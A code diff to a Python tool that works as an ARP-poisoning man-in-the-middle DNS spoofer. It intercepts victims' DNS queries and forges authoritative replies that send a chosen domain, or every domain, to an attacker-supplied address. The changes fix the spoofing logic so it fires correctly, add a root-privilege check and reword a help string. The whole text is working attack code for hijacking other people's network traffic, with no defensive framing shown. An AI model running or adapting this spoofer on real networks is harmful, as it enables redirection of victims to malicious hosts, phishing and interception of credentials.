@@ -5,23 +5,28 @@ from multiprocessing import Process
 import os
 import argparse
 
+
 def parse(packet):
     pkt = IP(packet.get_payload())
     if not pkt.haslayer(DNSQR):
         packet.accept()
+        return
     if(args.domain is not None):
         if(args.domain not in pkt[DNS].qd.qname):
             packet.accept()
-    else:
-        spkt =  (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
-                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
-                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect)))
-        packet.set_payload(str(spkt))
-        packet.accept()
+            return
+
+    spkt =  (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
+            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect)))
+    packet.set_payload(str(spkt))
+    packet.accept()
 
 
 def main():
+    if(os.getuid() != 0):
+        exit("This program must be run with root/sudo")
     arp_poison = Process(target=ArpPoison, args=(args.ip, args.router, args.iface))
     arp_poison.start()
 
@@ -45,7 +50,7 @@ if __name__ == '__main__':
     parser.add_argument("redirect", help="Address to redirect to")
     parser.add_argument("-d", "--domain", help="Domain to spoof")
     parser.add_argument("-i", "--iface", help="Interface to watch")
-    parser.add_argument("-r", "--router", help="Router IP addr")
+    parser.add_argument("-r", "--router", help="Router IP address")
     args = parser.parse_args()
     if(args.iface is None):
         args.iface = "eno1"
